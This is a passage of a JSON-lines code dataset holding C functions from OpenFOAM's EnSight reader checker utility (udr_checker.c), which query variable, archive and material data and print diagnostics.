TRUE\\n\");\n        }\n        else {\n          fprintf(stderr,\"   var contran:  FALSE\\n\");\n        }\n#endif\n\n      }\n      else if(var_type[i] == Z_SCALAR) {\n        fprintf(stderr,\"   var type:      Z_SCALAR\\n\");\n      }\n      else if(var_type[i] == Z_VECTOR) {\n        fprintf(stderr,\"   var type:      Z_VECTOR\\n\");\n      }\n      else if(var_type[i] == Z_TENSOR) {\n        fprintf(stderr,\"   var type:      Z_TENSOR\\n\");\n      }\n      else if(var_type[i] == Z_TENSOR9) {\n        fprintf(stderr,\"   var type:      Z_TENSOR9\\n\");\n      }\n      else {\n        fprintf(stderr,\"   Invalid var type\\n\");\n        return(Z_ERR);\n      }\n\n      if(var_classify[i] == Z_PER_NODE) {\n        fprintf(stderr,\"   var classify:  Z_PER_NODE\\n\");\n      }\n      else if(var_classify[i] == Z_PER_ELEM) {\n        fprintf(stderr,\"   var classify:  Z_PER_ELEM\\n\");\n      }\n      else if(var_classify[i] != Z_CONSTANT) {\n        fprintf(stderr,\"   Invalid var classify\\n\");\n        return(Z_ERR);\n      }\n\n#if (defined GT_USERD_API_100)\n      fprintf(stderr,\"   var timeset:   %d\\n\",var_timeset[i]);\n#endif\n    }\n  }\n\n  /* Free the allocated memory\n   *--------------------------*/\n  for(i=0; i<Num_vars; ++i) {\n    free(var_description[i]);\n    free(var_filename[i]);\n    free(var_ifilename[i]);\n  }\n  free(var_description);\n  free(var_filename);\n  free(var_ifilename);\n  free(var_type);\n  free(var_classify);\n  free(var_complex);\n  free(var_freq);\n  free(var_contran);\n  free(var_timeset);\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*-----------\n * var_loader\n *-----------*/\n", "func_signal": "static int\nvar_loader(int var_time_step)", "code": "{\n  int i, j, k;\n  int err;\n  int v, vn;\n  int var_timeset;\n  int p, pn;\n  int et, e1, e2;\n  int num_comps;\n  int num_dims;\n  int nsize;\n  int comp;\n  int bdim[3];\n  int ne;\n  int cell_type;\n  float constant_val;\n  char line1[Z_BUFL];\n  char line2[Z_BUFL];\n  float *values;\n  float *tvalues;\n  float minv[3],maxv[3];\n  int bd1,bd2,bd3;\n\n\n  fprintf(stderr,\"\\n--------------- var_loader --------------\\n\");\n\n  if(Num_time_steps > 1 && v == 0) {\n    if(var_time_step > (Num_time_steps - 1)) {\n      var_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the time step - to first step by default, but\n     * can set it at others using -vts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_step(var_time_step);\n\n    fprintf(stderr,\" Using time step: %d  (where range is %d through %d)\\n\\n\",\n            var_time_step,0,Num_time_steps-1);\n  }\n\n  for(v=0; v<Num_vars; ++v) {\n    vn = v + 1;\n\n    if(v > 0) {\n      fprintf(stderr,\"\\n\");\n    }\n    if(Varinfo[v].classify == Z_PER_NODE) {\n      fprintf(stderr,\" Z_PER_NODE Variable %d:\\n\",vn);\n    }\n    else {\n      fprintf(stderr,\" Z_PER_ELEM Variable %d:\\n\",vn);\n    }\n\n    /* Constants\n     *----------*/\n    if(Varinfo[v].type == Z_CONSTANT) {\n\n      constant_val = USERD_get_constant_value(vn);\n      fprintf(stderr,\"   Constant (%s):\\n\",Varinfo[v].description);\n      fprintf(stderr,\"     value: %g\\n\",constant_val);\n    }\n\n\n    /* Scalars, Vectors, Tensors\n     *--------------------------*/\n    else {\n\n      /* Get the var description line\n       *-----------------------------*/\n      err = USERD_get_description_lines(Z_VARI,vn,line1,line2);\n      if(err == Z_OK) {\n        fprintf(stderr,\"   Desc line: %s\\n\",line1);\n      }\n      else {\n        fprintf(stderr,\"Error: getting var description line\\n\");\n        return(Z_ERR);\n      }\n\n\n      /* Get the values by component\n       *-----------------------------*/\n      if(Varinfo[v].type == Z_SCALAR) {\n        num_comps = 1;\n      }\n      else if(Varinfo[v].type == Z_VECTOR) {\n        num_comps = 3;\n      }\n      else if(Varinfo[v].type == Z_TENSOR) {\n        num_comps = 6;\n      }\n      else if(Varinfo[v].type == Z_TENSOR9) {\n        num_comps = 9;\n      }\n\n\n      /* Per_Node\n       *---------*/\n      if(Varinfo[v].classify == Z_PER_NODE) {\n\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            nsize = Pbuild[p].nn;\n          }\n          else {\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n            nsize = bdim[0] * bdim[1] * bdim[2];\n          }\n\n\n          fprintf(stderr,\"   For part %d, with %d nodes:\\n\",pn,nsize);\n\n          if(nsize > 0) {\n            values = (float *) calloc((num_comps * nsize),sizeof(float));\n            if(values == (float *) NULL) {\n              fprintf(stderr,\"Error: alocating variable values\\n\");\n              return(Z_ERR);\n            }\n\n            if(num_comps == 1) {\n\n              if(Pbuild[p].type == Z_UNSTRUCTURED) {\n                err = USERD_get_scalar_values(vn,\n                                              pn,\n                                              0,\n                                              values);\n                if(err == Z_ERR) {\n                  fprintf(stderr,\"Error: getting scalar values\\n\");\n                  return(Z_ERR);\n                }\n              }\n              else {\n                err = USERD_get_block_scalar_values(pn,\n                                                    vn,\n                                                    values);\n                if(err == Z_ERR) {\n                  fprintf(stderr,\"Error: getting block scalar values\\n\");\n                  return(Z_ERR);\n                }\n              }\n\n              /* For the component, show 1st node, last node, min, max values\n               *-------------------------------------------------------------*/\n              minv[0] = maxv[0] = values[0];\n              for(i=0; i<nsize; ++i) {\n                if(values[i] < minv[0]) {\n                  minv[0] = values[i];\n                }\n                if(values[i] > maxv[0]) {\n                  maxv[0] = values[i];\n                }\n              }\n\n              fprintf(stderr,\"       node %10d value: %g\\n\",1,values[0]);\n              fprintf(stderr,\"       node %10d value: %g\\n\",nsize,values[nsize-1]);\n              fprintf(stderr,\"       min value:             %g\\n\",minv[0]);\n              fprintf(stderr,\"       max value:             %g\\n\",maxv[0]);\n\n            }\n\n            else if(num_comps == 3) {\n\n              if(Pbuild[p].type == Z_UNSTRUCTURED) {\n                err = USERD_get_vector_values(vn,\n                                              pn,\n                                              0,\n                                              values);\n                if(err == Z_ERR) {\n                  fprintf(stderr,\"Error: getting vector values\\n\");\n                  return(Z_ERR);\n                }\n              }\n              else {\n\n                tvalues = (float *) calloc(nsize,sizeof(float));\n                if(tvalues == (float *) NULL) {\n                  fprintf(stderr,\"Error: alocating tvalues array\\n\");\n                  return(Z_ERR);\n                }\n\n                for(i=0; i<3; ++i) {\n                  err = USERD_get_block_vector_values_by_component(pn,\n                                                                   vn,\n                                                                   i,\n                                                                   tvalues);\n                  if(err == Z_ERR) {\n                    fprintf(stderr,\"Error: getting vector values\\n\");\n                    return(Z_ERR);\n                  }\n                  for(j=0; j<nsize; ++j) {\n                    k = j*3 + i;\n                    values[k] = tvalues[j];\n                  }\n                }\n                free(tvalues);\n              }\n\n              /* For the component, show 1st node, last node, min, max values\n               *-------------------------------------------------------------*/\n              minv[0] = maxv[0] = values[0];\n              minv[1] = maxv[1] = values[1];\n              minv[2] = maxv[2] = values[2];\n              for(i=0; i<nsize; ++i) {\n                j = i*3;\n                for(k=0; k<3; ++k) {\n                  if(values[j+k] < minv[k]) {\n                    minv[k] = values[j+k];\n                  }\n                  if(values[j+k] > maxv[k]) {\n                    maxv[k] = values[j+k];\n                  }\n                }\n              }\n\n              fprintf(stderr,\"       node %10d values: %g %g %g\\n\",1,\n                      values[0],values[1],values[2]);\n              fprintf(stderr,\"       node %10d values: %g %g %g\\n\",nsize,\n                      values[3*nsize-3],values[3*nsize-2],values[3*nsize-1]);\n              fprintf(stderr,\"       min values:             %g %g %g\\n\",\n                      minv[0],minv[1],minv[2]);\n              fprintf(stderr,\"       max values:             %g %g %g\\n\",\n                      maxv[0],maxv[1],maxv[2]);\n\n            }\n            free(values);\n          }\n        }\n      }\n\n      /* Per_Elem\n       *---------*/\n      else {\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type != Z_UNSTRUCTURED) {\n\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n            bd1 = bdim[0]-1;\n            if(bd1 < 1) {\n              bd1 = 1;\n            }\n            bd2 = bdim[1]-1;\n            if(bd2 < 1) {\n              bd2 = 1;\n            }\n            bd3 = bdim[2]-1;\n            if(bd3 < 1) {\n              bd3 = 1;\n            }\n            nsize = bd1 * bd2 * bd3;\n\n\n            /* Determine cell type\n             *--------------------*/\n            num_dims = 3;\n            for(i=0; i<3; ++i) {\n              if(bdim[i] == 1) {\n                --num_dims;\n              }\n            }\n            if(num_dims == 3) {\n              cell_type = Z_HEX08;\n            }\n            else if(num_dims == 2) {\n              cell_type = Z_QUA04;\n            }\n            else {\n              cell_type = Z_BAR02;\n            }\n          }\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            e1 = 0;\n            e2 = Z_MAXTYPE-1;\n          }\n          else {\n            e1 = e2 = cell_type;\n          }\n\n          for(et=e1; et<=e2; ++et) {\n\n            if(Pbuild[p].type == Z_UNSTRUCTURED) {\n              nsize = Pbuild[p].ne[et];\n            }\n\n            if(nsize > 0) {\n\n              fprintf(stderr,\"   For part %d, with %d elems of type %s:\\n\",\n                      pn,nsize,Elem_info[et].name);\n\n              values = (float *) calloc((num_comps * nsize),sizeof(float));\n              if(values == (float *) NULL) {\n                fprintf(stderr,\"Error: alocating variable values\\n\");\n                return(Z_ERR);\n              }\n\n              if(num_comps == 1) {\n                if(Pbuild[p].type == Z_UNSTRUCTURED) {\n                  err = USERD_get_scalar_values(vn,\n                                                pn,\n                                                et,\n                                                values);\n                  if(err == Z_ERR) {\n                    fprintf(stderr,\"Error: getting scalar values\\n\");\n                    return(Z_ERR);\n                  }\n                }\n                else {\n                  err = USERD_get_block_scalar_values(pn,\n                                                      vn,\n                                                      values);\n                  if(err == Z_ERR) {\n                    fprintf(stderr,\"Error: getting block scalar values\\n\");\n                    return(Z_ERR);\n                  }\n                }\n\n                /* For the component, show 1st node, last node, min, max values\n                 *-------------------------------------------------------------*/\n                minv[0] = maxv[0] = values[0];\n                for(i=1; i<nsize; ++i) {\n                  if(values[i] < minv[0]) {\n                    minv[0] = values[i];\n                  }\n                  if(values[i] > maxv[0]) {\n                    maxv[0] = values[i];\n                  }\n                }\n\n                fprintf(stderr,\"       elem %10d value: %g\\n\",1,values[0]);\n                fprintf(stderr,\"       elem %10d value: %g\\n\",nsize,values[nsize-1]);\n                fprintf(stderr,\"       min value:             %g\\n\",minv[0]);\n                fprintf(stderr,\"       max value:             %g\\n\",maxv[0]);\n\n              }\n\n              else if(num_comps == 3) {\n\n                if(Pbuild[p].type == Z_UNSTRUCTURED) {\n                  err = USERD_get_vector_values(vn,\n                                                pn,\n                                                et,\n                                                values);\n                  if(err == Z_ERR) {\n                    fprintf(stderr,\"Error: getting vector values\\n\");\n                    return(Z_ERR);\n                  }\n                }\n                else {\n\n                  tvalues = (float *) calloc(nsize,sizeof(float));\n                  if(tvalues == (float *) NULL) {\n                    fprintf(stderr,\"Error: alocating tvalues array\\n\");\n                    return(Z_ERR);\n                  }\n\n                  for(i=0; i<3; ++i) {\n                    err = USERD_get_block_vector_values_by_component(pn,\n                                                                     vn,\n                                                                     i,\n                                                                     tvalues);\n                    if(err == Z_ERR) {\n                      fprintf(stderr,\"Error: getting vector values\\n\");\n                      return(Z_ERR);\n                    }\n                    for(j=0; j<nsize; ++j) {\n                      k = j*3 + i;\n                      values[k] = tvalues[j];\n                    }\n                  }\n                  free(tvalues);\n                }\n\n                /* For the component, show 1st node, last node, min, max values\n                 *-------------------------------------------------------------*/\n                minv[0] = maxv[0] = values[0];\n                minv[1] = maxv[1] = values[1];\n                minv[2] = maxv[2] = values[2];\n                for(i=1; i<=nsize; ++i) {\n                  j = i*3;\n                  for(k=0; k<3; ++k) {\n                    if(values[j+k] < minv[k]) {\n                      minv[k] = values[j+k];\n                    }\n                    if(values[j+k] > maxv[k]) {\n                      maxv[k] = values[j+k];\n                    }\n                  }\n                }\n\n                fprintf(stderr,\"       elem %10d values: %g %g %g\\n\",1,\n                        values[0],values[1],values[2]);\n                fprintf(stderr,\"       elem %10d values: %g %g %g\\n\",nsize,\n                        values[3*nsize-3],values[3*nsize-2],values[3*nsize-1]);\n                fprintf(stderr,\"       min values:             %g %g %g\\n\",\n                        minv[0],minv[1],minv[2]);\n                fprintf(stderr,\"       max values:             %g %g %g\\n\",\n                        maxv[0],maxv[1],maxv[2]);\n\n              }\n              free(values);\n            }\n          }\n        }\n      }\n    }\n  }\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * variable_info\n *--------------*/\n", "func_signal": "static int\nvariable_info( void )", "code": "{\n  int i,j;\n  int err;\n\n  char **var_description;\n  char **var_filename;\n  int *var_type;\n  int *var_classify;\n  int *var_complex;\n  char **var_ifilename;\n  float *var_freq;\n  int *var_contran;\n  int *var_timeset;\n\n\n  fprintf(stderr,\"\\n------------ variable_info --------------\\n\");\n\n  /* Get the number of variables\n   *----------------------------*/\n  Num_vars = USERD_get_number_of_variables();\n  if(Num_vars < 0) {\n    fprintf(stderr,\"Error: getting the number of variables\\n\");\n  }\n  else {\n    fprintf(stderr,\" Number of variables: %d\\n\",Num_vars);\n  }\n\n\n  /* Get the gold variable info\n   *---------------------------*/\n  Varinfo = (VARINFO *) calloc(Num_vars,sizeof(VARINFO));\n  if(Varinfo == (VARINFO *)NULL) {\n    fprintf(stderr,\" Problems allocating for Varinfo structure\\n\");\n    return(Z_ERR);\n  }\n\n\n  var_description = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_description == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var description\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_description[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_description[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var description\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_filename = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_filename == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var filename\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_filename[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_filename[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var filename\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_type = (int *) calloc(Num_vars,sizeof(int));\n  if(var_type == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var type\\n\");\n    return(Z_ERR);\n  }\n\n  var_classify = (int *) calloc(Num_vars,sizeof(int));\n  if(var_classify == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var classify\\n\");\n    return(Z_ERR);\n  }\n\n  var_complex = (int *) calloc(Num_vars,sizeof(int));\n  if(var_complex == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var complex\\n\");\n    return(Z_ERR);\n  }\n\n\n  var_ifilename = (char **) calloc(Num_vars,sizeof(char *));\n  if(var_ifilename == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for var ifilename\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n      var_ifilename[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(var_ifilename[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for var ifilename\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  var_freq = (float *) calloc(Num_vars,sizeof(float));\n  if(var_freq == (float *)NULL) {\n    fprintf(stderr,\" Problems allocating for var freq\\n\");\n    return(Z_ERR);\n  }\n\n  var_contran = (int *) calloc(Num_vars,sizeof(int));\n  if(var_contran == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var contran\\n\");\n    return(Z_ERR);\n  }\n\n  var_timeset = (int *) calloc(Num_vars,sizeof(int));\n  if(var_timeset == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for var timeset\\n\");\n    return(Z_ERR);\n  }\n\n#if (defined GT_USERD_API_100)\n\n  err = USERD_get_gold_variable_info(var_description,\n                                     var_filename,\n                                     var_type,\n                                     var_classify,\n                                     var_complex,\n                                     var_ifilename,\n                                     var_freq,\n                                     var_contran,\n                                     var_timeset);\n#else\n\n  err = USERD_get_variable_info(var_description,\n                                var_filename,\n                                var_type,\n                                var_classify);\n\n#endif\n\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: getting variable info\\n\");\n  }\n  else {\n    for(i=0; i<Num_vars; ++i) {\n\n      /* Loading the global\n       * (for use in other routines)\n       *----------------------------*/\n      strncpy(Varinfo[i].description,var_description[i],Z_BUFL);\n      strncpy(Varinfo[i].filename,var_filename[i],Z_BUFL);\n      strncpy(Varinfo[i].ifilename,var_ifilename[i],Z_BUFL);\n      Varinfo[i].type     = var_type[i];\n      Varinfo[i].classify = var_classify[i];\n      Varinfo[i].complex  = var_complex[i];\n      Varinfo[i].freq     = var_freq[i];\n      Varinfo[i].contran  = var_contran[i];\n      Varinfo[i].timeset  = var_timeset[i];\n\n      /* Echo some feedback\n       *-------------------*/\n      fprintf(stderr,\" For Variable %d:\\n\",i+1);\n\n      fprintf(stderr,\"   var desc:      %s\\n\",var_description[i]);\n      fprintf(stderr,\"   var filename:  %s\\n\",var_filename[i]);\n\n#if (defined GT_USERD_API_100)\n      if(var_complex[i]) {\n        fprintf(stderr,\"   var complex:   TRUE\\n\");\n        fprintf(stderr,\"   var ifilename: %s\\n\",var_ifilename[i]);\n        fprintf(stderr,\"   var freq:      %g\\n\",var_freq[i]);\n      }\n      else {\n        fprintf(stderr,\"   var complex:   FALSE\\n\");\n      }\n#endif\n\n      if(var_type[i] == Z_CONSTANT) {\n        fprintf(stderr,\"   var type:      Z_CONSTANT\\n\");\n\n#if (defined GT_USERD_API_100)\n        if(var_contran[i]) {\n          fprintf(stderr,\"   var contran:  TRUE\\n\");\n        }\n        else {\n          fprintf(stderr,\"   var contran:  FALSE\\n\");\n        }\n#endif\n\n      }\n      else if(var_type[i] == Z_SCALAR) {\n        fprintf(stderr,\"   var type:      Z_SCALAR\\n\");\n      }\n      else if(var_type[i] == Z_VECTOR) {\n        fprintf(stderr,\"   var type:      Z_VECTOR\\n\");\n      }\n      else if(var_type[i] == Z_TENSOR) {\n        fprintf(stderr,\"   var type:      Z_TENSOR\\n\");\n      }\n      else if(var_type[i] == Z_TENSOR9) {\n        fprintf(stderr,\"   var type:      Z_TENSOR9\\n\");\n      }\n      else {\n        fprintf(stderr,\"   Invalid var type\\n\");\n        return(Z_ERR);\n      }\n\n      if(var_classify[i] == Z_PER_NODE) {\n        fprintf(stderr,\"   var classify:  Z_PER_NODE\\n\");\n      }\n      else if(var_classify[i] == Z_PER_ELEM) {\n        fprintf(stderr,\"   var classify:  Z_PER_ELEM\\n\");\n      }\n      else if(var_classify[i] != Z_CONSTANT) {\n        fprintf(stderr,\"   Invalid var classify\\n\");\n        return(Z_ERR);\n      }\n\n#if (defined GT_USERD_API_100)\n      fprintf(stderr,\"   var timeset:   %d\\n\",var_timeset[i]);\n#endif\n    }\n  }\n\n  /* Free the allocated memory\n   *--------------------------*/\n  for(i=0; i<Num_vars; ++i) {\n    free(var_description[i]);\n    free(var_filename[i]);\n    free(var_ifilename[i]);\n  }\n  free(var_description);\n  free(var_filename);\n  free(var_ifilename);\n  free(var_type);\n  free(var_classify);\n  free(var_complex);\n  free(var_freq);\n  free(var_contran);\n  free(var_timeset);\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * exercise_bkup\n *--------------*/\n", "func_signal": "static int\nexercise_bkup( void )", "code": "{\n  int err;\n  FILE *arcfile;\n\n  fprintf(stderr,\"\\n------------ exercise_archive -----------\\n\");\n\n  arcfile = fopen(\"test.arc\",\"wb\");\n  if(arcfile == (FILE *)NULL) {\n    fprintf(stderr,\"Error: opening test archive file\\n\");\n    return(Z_ERR);\n  }\n  err = USERD_bkup(arcfile,Z_SAVE_ARCHIVE);\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: saving to test archive file\\n\");\n    return(Z_ERR);\n  }\n  fclose(arcfile);\n\n  arcfile = fopen(\"test.arc\",\"rb\");\n  err = USERD_bkup(arcfile,Z_REST_ARCHIVE);\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: restoring from test archive file\\n\");\n    return(Z_ERR);\n  }\n\n  fprintf(stderr,\" Archive test completed\\n\");\n\n  fclose(arcfile);\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*----------------------\n * gold_materials_loader\n *----------------------*/\n", "func_signal": "static int\ngold_materials_loader(int geom_time_step)", "code": "{\n  int i, j, k, ms, nn;\n  int err, err1, err2;\n  int geom_timeset;\n  int p, pn;\n  int et, e1, e2;\n  int num_dims;\n  int comp;\n  int bdim[3];\n  int ne;\n  int cell_type;\n  int bd1,bd2,bd3;\n  int *ivals;\n  float *fvals;\n  int do_num;\n  int mixed_present;\n  int matf_size, matfv_size;\n\n\n  fprintf(stderr,\"\\n-------------- materials_loader --------------\\n\");\n\n  if(Num_time_sets > 0) {\n    /* Get the timeset used for the geometry\n     *--------------------------------------*/\n    geom_timeset = USERD_get_geom_timeset_number();\n\n    /* Get the number of time steps for this timeset\n     *----------------------------------------------*/\n    Num_time_steps = USERD_get_num_of_time_steps(geom_timeset);\n    if(Num_time_steps < 1) {\n      fprintf(stderr,\" Error: Num time steps returned: %d\\n\",Num_time_steps);\n      fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n      return(Z_ERR);\n    }\n    if(geom_time_step > (Num_time_steps - 1)) {\n      geom_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the timeset and step - to first step by default, but\n     * can set it at others using -gts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_set_and_step(geom_timeset,geom_time_step);\n\n    fprintf(stderr,\" Using timeset:   %d  (step range is %d through %d)\\n\",\n            geom_timeset,0,Num_time_steps-1);\n    fprintf(stderr,\" Using time step: %d\\n\",geom_time_step);\n  }\n\n  for(ms=0; ms<Num_materials_sets; ++ms) {\n    fprintf(stderr,\"\\n\");\n    fprintf(stderr,\" Materials Set %d:\\n\",ms+1);\n\n    for(p=0; p<Num_parts; ++p) {\n      pn = p+1;\n\n      fprintf(stderr,\"\\n\");\n      fprintf(stderr,\"   Part %d:\\n\",pn);\n\n      /*-----------------------\n       * For unstructured parts\n       *-----------------------*/\n      if(Pbuild[p].type == Z_UNSTRUCTURED) {\n\n        e1 = 0;\n        e2 = Z_MAXTYPE;\n      }\n      else {\n        for(comp=0; comp<3; ++comp) {\n          if(Pbuild[p].ne[comp] < 1) {\n            bdim[comp] = 1;\n          }\n          else {\n            bdim[comp] = Pbuild[p].ne[comp];\n          }\n        }\n        nn = bdim[0] * bdim[1] * bdim[2];\n\n        bd1 = bdim[0]-1;\n        if(bd1 < 1) {\n          bd1 = 1;\n        }\n        bd2 = bdim[1]-1;\n        if(bd2 < 1) {\n          bd2 = 1;\n        }\n        bd3 = bdim[2]-1;\n        if(bd3 < 1) {\n          bd3 = 1;\n        }\n        ne = bd1 * bd2 * bd3;\n\n        /* Determine cell type\n         *--------------------*/\n        num_dims = 3;\n        for(i=0; i<3; ++i) {\n          if(bdim[i] == 1) {\n            --num_dims;\n          }\n        }\n        if(num_dims == 3) {\n          cell_type = Z_HEX08;\n        }\n        else if(num_dims == 2) {\n          cell_type = Z_QUA04;\n        }\n        else {\n          cell_type = Z_BAR02;\n        }\n\n        e1 = cell_type;\n        e2 = cell_type + 1;\n      }\n\n\n      for(et=e1; et<e2; ++et) {\n\n        if(Pbuild[p].type == Z_UNSTRUCTURED) {\n          ne = Pbuild[p].ne[et];\n        }\n\n        if(ne > 0) {\n\n          /* Get the material ids, if any\n           *-----------------------------*/\n          err = USERD_size_matf_data(ms,\n                                     pn,\n                                     et,\n                                     Z_MAT_INDEX,\n                                     &matf_size);\n          if(err == Z_OK && matf_size > 0) {\n\n\n            /* Go get the material ids\n             *------------------------*/\n            ivals = (int *) calloc(matf_size,sizeof(int));\n            if(ivals == (int *)NULL) {\n              fprintf(stderr,\" Problems allocating for material ids\\n\");\n              return(Z_ERR);\n            }\n            err = USERD_load_matf_data(ms,\n                                       pn,\n                                       et,\n                                       Z_MAT_INDEX,\n                                       ivals,\n                                       fvals);\n            if(err == Z_OK) {\n              if(matf_size < 20) {\n                fprintf(stderr,\"     Printing all mat ids for %s elements\\n\",\n                        Elem_info[et].name);\n                do_num = matf_size;\n              }\n              else {\n                fprintf(stderr,\"     Printing first 20 mat ids for %s elements\\n\",\n                        Elem_info[et].name);\n                do_num = 20;\n              }\n\n              /* See if any mixed materials\n               *---------------------------*/\n              mixed_present = FALSE;\n              for(k=0; k<matf_size; ++k) {\n                if(ivals[k] < 0) {\n                  mixed_present = TRUE;\n                  break;\n                }\n              }\n\n              /* Feedback\n               *---------*/\n              for(k=0; k<do_num; ++k) {\n                fprintf(stderr,\"       mat id[%d] = %d\\n\",k,ivals[k]);\n              }\n              free(ivals);\n            }\n            else {\n              fprintf(stderr,\"     Trouble getting mat ids for %s elements\\n\",\n                      Elem_info[et].name);\n              free(ivals);\n              return(Z_ERR);\n            }\n          }\n          else {\n            fprintf(stderr,\"     %s elements have no material ids\\n\",\n                    Elem_info[et].name);\n          }\n\n\n          /* Get the mixed material ids, if any\n           *-----------------------------------*/\n          if(mixed_present) {\n            err1 = USERD_size_matf_data(ms,\n                                        pn,\n                                        et,\n                                        Z_MIX_INDEX,\n                                        &matf_size);\n            err2 = USERD_size_matf_data(ms,\n                                        pn,\n                                        et,\n                                        Z_MIX_VALUE,\n                                        &matfv_size);\n\n            if(err1 == Z_OK &&\n               err2 == Z_OK &&\n               matf_size > 0 &&\n               matfv_size > 0) {\n\n              /* Go get the material ids\n               *------------------------*/\n              ivals = (int *) calloc(matf_size,sizeof(int));\n              if(ivals == (int *)NULL) {\n                fprintf(stderr,\" Problems allocating for mixed material ids\\n\");\n                return(Z_ERR);\n              }\n              fvals = (float *) calloc(matfv_size,sizeof(float));\n              if(fvals == (float *)NULL) {\n                fprintf(stderr,\" Problems allocating for mixed material values\\n\");\n                return(Z_ERR);\n              }\n\n              err1 = USERD_load_matf_data(ms,\n                                          pn,\n                                          et,\n                                          Z_MIX_INDEX,\n                                          ivals,\n                                          fvals);\n\n              err2 = USERD_load_matf_data(ms,\n                                          pn,\n                                          et,\n                                          Z_MIX_VALUE,\n                                          ivals,\n                                          fvals);\n              if(err1 == Z_OK &&\n                 err2 == Z_OK) {\n                if(matf_size < 20) {\n                  fprintf(stderr,\"     Printing all mixed mat ids for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = matf_size;\n                }\n                else {\n                  fprintf(stderr,\"     Printing first 20 mixed mat ids for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = 20;\n                }\n                for(k=0; k<do_num; ++k) {\n                  fprintf(stderr,\"       mixed mat id[%d] = %d\\n\",k,ivals[k]);\n                }\n                free(ivals);\n\n                if(matfv_size < 20) {\n                  fprintf(stderr,\"     Printing all mixed mat values for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = matfv_size;\n                }\n                else {\n                  fprintf(stderr,\"     Printing first 20 mixed mat values for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = 20;\n                }\n                for(k=0; k<do_num; ++k) {\n                  fprintf(stderr,\"       mixed mat val[%d] = %f\\n\",k,fvals[k]);\n                }\n                free(fvals);\n              }\n              else {\n                fprintf(stderr,\"     Trouble getting mixed mat ids or vals for %s elements\\n\",\n                        Elem_info[et].name);\n                free(ivals);\n                free(fvals);\n                return(Z_ERR);\n              }\n            }\n            else {\n              fprintf(stderr,\"     Trouble getting mixed mat sizes for %s elements\\n\",\n                      Elem_info[et].name);\n              return(Z_ERR);\n            }\n          }\n          else {\n            fprintf(stderr,\"       (%s elements have no mixed material ids)\\n\",\n                    Elem_info[et].name);\n          }\n        }\n      }\n    }\n  }\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
